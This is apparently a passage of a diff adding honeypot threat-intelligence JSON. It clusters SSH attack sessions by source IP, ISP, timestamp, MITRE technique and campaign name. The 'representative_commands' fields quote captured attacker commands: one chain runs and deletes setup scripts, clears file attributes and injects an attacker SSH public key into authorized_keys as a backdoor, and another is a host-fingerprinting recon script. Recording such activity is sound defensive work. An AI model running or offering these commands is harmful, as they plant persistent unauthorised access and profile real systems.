+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:28:53.115348Z"
+        },
+        {
+          "session_id": "IR-114a707e3b0a",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:28:58.272946Z"
+        },
+        {
+          "session_id": "IR-ff10ca5612ad",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:29:03.085757Z"
+        },
+        {
+          "session_id": "IR-de183522318b",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:29:07.840721Z"
+        },
+        {
+          "session_id": "IR-1087f5de8591",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:29:12.621588Z"
+        },
+        {
+          "session_id": "IR-fda481a3a92f",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:29:17.846295Z"
+        },
+        {
+          "session_id": "IR-e649c1712533",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:29:22.704716Z"
+        },
+        {
+          "session_id": "IR-9d0bc9b4b091",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:29:27.505031Z"
+        },
+        {
+          "session_id": "IR-154870b1bd37",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:29:32.718867Z"
+        },
+        {
+          "session_id": "IR-428d26e5505a",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:29:37.580766Z"
+        },
+        {
+          "session_id": "IR-ffe70510e50d",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:29:42.584287Z"
+        },
+        {
+          "session_id": "IR-8cf2472a7cf4",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:29:47.341562Z"
+        },
+        {
+          "session_id": "IR-6583cb4c8fb7",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:29:52.074746Z"
+        },
+        {
+          "session_id": "IR-d247b70982a6",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:29:57.241619Z"
+        },
+        {
+          "session_id": "IR-345febbab35a",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:30:01.939157Z"
+        },
+        {
+          "session_id": "IR-867320464d86",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:30:07.174037Z"
+        },
+        {
+          "session_id": "IR-18981ffd2b62",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:30:11.970280Z"
+        },
+        {
+          "session_id": "IR-464b73d8de9c",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:30:17.161834Z"
+        },
+        {
+          "session_id": "IR-0f115d88b3b8",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:30:22.025648Z"
+        },
+        {
+          "session_id": "IR-349deee6d970",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:30:26.977183Z"
+        },
+        {
+          "session_id": "IR-7213e149e31c",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:30:32.035611Z"
+        },
+        {
+          "session_id": "IR-5876991a1a39",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:30:36.798690Z"
+        },
+        {
+          "session_id": "IR-324422c1a12a",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:30:41.388515Z"
+        },
+        {
+          "session_id": "IR-522da5ba4316",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:30:46.383903Z"
+        },
+        {
+          "session_id": "IR-711dd6222192",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:30:51.247503Z"
+        },
+        {
+          "session_id": "IR-84e9c082da9e",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:30:56.224055Z"
+        },
+        {
+          "session_id": "IR-3eac2edaf469",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:31:00.928505Z"
+        },
+        {
+          "session_id": "IR-3d539db627ea",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:31:05.691311Z"
+        },
+        {
+          "session_id": "IR-35b2878aba23",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:31:10.443461Z"
+        },
+        {
+          "session_id": "IR-2ef14a4d3c9f",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:31:15.259608Z"
+        },
+        {
+          "session_id": "IR-00b34f1fee04",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:31:19.867240Z"
+        },
+        {
+          "session_id": "IR-379af7f58ece",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:31:24.604887Z"
+        },
+        {
+          "session_id": "IR-9dd22d7fbf99",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:31:29.443980Z"
+        },
+        {
+          "session_id": "IR-361cd51962ca",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:31:34.210026Z"
+        },
+        {
+          "session_id": "IR-eadf00b77035",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:31:39.208122Z"
+        },
+        {
+          "session_id": "IR-6a6c46ce2d32",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:31:43.924316Z"
+        },
+        {
+          "session_id": "IR-225f5d0c26aa",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:31:48.600998Z"
+        },
+        {
+          "session_id": "IR-efb8b016a5b1",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:31:53.660308Z"
+        },
+        {
+          "session_id": "IR-22698b8fbc44",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:31:58.406867Z"
+        },
+        {
+          "session_id": "IR-02df42b7f91d",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:32:03.267051Z"
+        },
+        {
+          "session_id": "IR-ef785d195994",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:32:08.246993Z"
+        },
+        {
+          "session_id": "IR-158c43b30184",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:32:12.950477Z"
+        },
+        {
+          "session_id": "IR-4cd112b6b06c",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:32:17.788343Z"
+        },
+        {
+          "session_id": "IR-215e3cf8bf5b",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:32:22.502379Z"
+        },
+        {
+          "session_id": "IR-09d311baf93b",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:32:27.343590Z"
+        },
+        {
+          "session_id": "IR-bc1c1fc35a59",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:32:32.436872Z"
+        },
+        {
+          "session_id": "IR-dd9e33171fa1",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:32:37.227899Z"
+        },
+        {
+          "session_id": "IR-81afe702c7ac",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:32:41.854652Z"
+        },
+        {
+          "session_id": "IR-6be036771534",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:32:46.730220Z"
+        },
+        {
+          "session_id": "IR-2d1725edb015",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:32:51.531407Z"
+        },
+        {
+          "session_id": "IR-1c012093f0bc",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:32:56.164871Z"
+        },
+        {
+          "session_id": "IR-7d80201682d5",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:33:01.124768Z"
+        },
+        {
+          "session_id": "IR-987d5dfa1d1c",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:33:05.956385Z"
+        },
+        {
+          "session_id": "IR-3661e8673122",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:33:11.141481Z"
+        },
+        {
+          "session_id": "IR-dd6c20a53502",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:33:16.099318Z"
+        },
+        {
+          "session_id": "IR-702729f1291e",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:33:20.947488Z"
+        },
+        {
+          "session_id": "IR-cd3768bdd1b9",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:33:25.703655Z"
+        },
+        {
+          "session_id": "IR-0499f27fb0fc",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:33:30.453515Z"
+        },
+        {
+          "session_id": "IR-05e8335accf3",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:33:34.976224Z"
+        },
+        {
+          "session_id": "IR-e8931f1e530b",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:33:40.074947Z"
+        },
+        {
+          "session_id": "IR-75286be787ac",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:33:44.915148Z"
+        },
+        {
+          "session_id": "IR-51d7f138ca75",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:33:49.932481Z"
+        },
+        {
+          "session_id": "IR-bbe4142a944f",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:33:54.511909Z"
+        },
+        {
+          "session_id": "IR-cd5948a23843",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:33:59.292095Z"
+        },
+        {
+          "session_id": "IR-56aaa3f18cb0",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:34:04.317274Z"
+        },
+        {
+          "session_id": "IR-8645cc4db824",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:34:08.713443Z"
+        },
+        {
+          "session_id": "IR-b282f0fb11ef",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:34:13.421444Z"
+        },
+        {
+          "session_id": "IR-07156ff96133",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:34:17.880310Z"
+        },
+        {
+          "session_id": "IR-f3b12269b66b",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:34:22.241117Z"
+        },
+        {
+          "session_id": "IR-4e881a007f28",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:34:26.871655Z"
+        },
+        {
+          "session_id": "IR-d79faa578e06",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:34:31.545944Z"
+        },
+        {
+          "session_id": "IR-235a946a4c14",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:34:35.931208Z"
+        },
+        {
+          "session_id": "IR-5d2f45fd55cd",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:34:40.407892Z"
+        },
+        {
+          "session_id": "IR-0ca6a4d00e74",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:34:44.822625Z"
+        },
+        {
+          "session_id": "IR-84534db3a86e",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:34:49.493478Z"
+        },
+        {
+          "session_id": "IR-8699c70115df",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:34:53.871334Z"
+        },
+        {
+          "session_id": "IR-e6e540989324",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:34:58.323691Z"
+        },
+        {
+          "session_id": "IR-33bd57a69b0c",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:35:03.028895Z"
+        },
+        {
+          "session_id": "IR-5250a5756d56",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:35:07.370909Z"
+        },
+        {
+          "session_id": "IR-4c9b8b7914e4",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:35:11.740927Z"
+        },
+        {
+          "session_id": "IR-fe5769604ff9",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:35:16.420441Z"
+        },
+        {
+          "session_id": "IR-90177d079c1d",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:35:20.841473Z"
+        },
+        {
+          "session_id": "IR-f695679918c6",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:35:25.466582Z"
+        },
+        {
+          "session_id": "IR-43ada889c66c",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:35:29.559678Z"
+        },
+        {
+          "session_id": "IR-2be092598d04",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:35:33.912507Z"
+        },
+        {
+          "session_id": "IR-fc4dba548156",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:35:38.446475Z"
+        },
+        {
+          "session_id": "IR-48564a8480d9",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:35:43.556069Z"
+        },
+        {
+          "session_id": "IR-99e9c41a339b",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:35:47.196599Z"
+        },
+        {
+          "session_id": "IR-90fa52c13051",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:35:51.765332Z"
+        },
+        {
+          "session_id": "IR-d2c4d5955d9b",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:35:56.184323Z"
+        },
+        {
+          "session_id": "IR-cb7a9743f223",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:36:00.582364Z"
+        },
+        {
+          "session_id": "IR-4d69c00f88c8",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:36:05.006528Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-014",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "115.191.23.138"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "c32b4937ce8564ea",
+      "ttps": [
+        {
+          "id": "T1021.004",
+          "name": "Remote Services: SSH"
+        }
+      ],
+      "representative_commands": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh"
+      ],
+      "members": [
+        {
+          "session_id": "IR-dc4f1a9d9540",
+          "src_ip": "115.191.23.138",
+          "country": "CN",
+          "isp": "Beijing Volcano Engine Technology Co., Ltd.",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:30:45.824957Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-015",
+      "is_campaign": true,
+      "campaign_name": "mdrfckr SSH Key Injection",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+      "matched_campaigns": [
+        {
+          "name": "mdrfckr SSH Key Injection",
+          "ttps": [
+            "T1021.004",
+            "T1078",
+            "T1105"
+          ],
+          "severity": "HIGH",
+          "description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+          "pattern_hits": 1,
+          "pattern_total": 3
+        }
+      ],
+      "session_count": 1,
+      "unique_ips": [
+        "77.90.185.20"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "560104d0f634867a",
+      "ttps": [
+        {
+          "id": "T1021.004",
+          "name": "Remote Services: SSH"
+        },
+        {
+          "id": "T1078",
+          "name": "Valid Accounts"
+        },
+        {
+          "id": "T1070",
+          "name": "Indicator Removal"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files"
+        },
+        {
+          "id": "T1105",
+          "name": "T1105"
+        }
+      ],
+      "representative_commands": [
+        "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h"
+      ],
+      "members": [
+        {
+          "session_id": "IR-97e720cf4cab",
+          "src_ip": "77.90.185.20",
+          "country": "LT",
+          "isp": "Limited Network LTD",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:34:45.169224Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-016",
+      "is_campaign": true,
+      "campaign_name": "Recon Loader Script",
+      "campaign_severity": "MEDIUM",
+      "campaign_description": "Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.",
+      "matched_campaigns": [
+        {
+          "name": "Recon Loader Script",
+          "ttps": [
+            "T1078",
+            "T1083",
+            "T1592",
+            "T1082"
+          ],
+          "severity": "MEDIUM",
+          "description": "Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.",
+          "pattern_hits": 3,
+          "pattern_total": 6
+        },
+        {
+          "name": "Mirai/IoT Botnet",
+          "ttps": [
+            "T1105",
+            "T1059.004"
+          ],
+          "severity": "HIGH",
+          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+          "pattern_hits": 1,
+          "pattern_total": 3
+        }
+      ],
+      "session_count": 6,
+      "unique_ips": [
+        "195.178.110.217"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "2cbee8b05d8e48f5",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1592",
+          "name": "Gather Victim Host Info"
+        },
+        {
+          "id": "T1078",
+          "name": "T1078"
+        },
+        {
+          "id": "T1083",
+          "name": "T1083"
+        }
+      ],
+      "representative_commands": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n \"$v\" ] && { printf '%s\\n' \"$v\"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\\n' \"$v\") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n \"$v\" ] && { printf '%s\\n' \"$v\"; exit; }; done; for c in arch"
+      ],
+      "members": [
+        {
+          "session_id": "IR-d27e049378f5",
+          "src_ip": "195.178.110.217",
+          "country": "NL",
+          "isp": "TECHOFF SRV LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:45:25.592750Z"
+        },
+        {
+          "session_id": "IR-37376d4dd559",
+          "src_ip": "195.178.110.217",
+          "country": "NL",
+          "isp": "TECHOFF SRV LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:47:07.162223Z"
+        },
+        {
+          "session_id": "IR-79bc9338fbe6",
+          "src_ip": "195.178.110.217",
+          "country": "NL",
+          "isp": "TECHOFF SRV LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:48:52.622003Z"
+        },
+        {
+          "session_id": "IR-9c02abfaf44f",
+          "src_ip": "195.178.110.217",
+          "country": "NL",
+          "isp": "TECHOFF SRV LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:50:43.892107Z"
+        },
+        {
+          "session_id": "IR-9627f0aaa347",
+          "src_ip": "195.178.110.217",
+          "country": "NL",
+          "isp": "TECHOFF SRV LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:52:34.862365Z"
+        },
+        {
+          "session_id": "IR-cb1dc458bfab",
+          "src_ip": "195.178.110.217",
+          "country": "NL",
+          "isp": "TECHOFF SRV LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:54:27.979208Z"
         }
       ]
     }
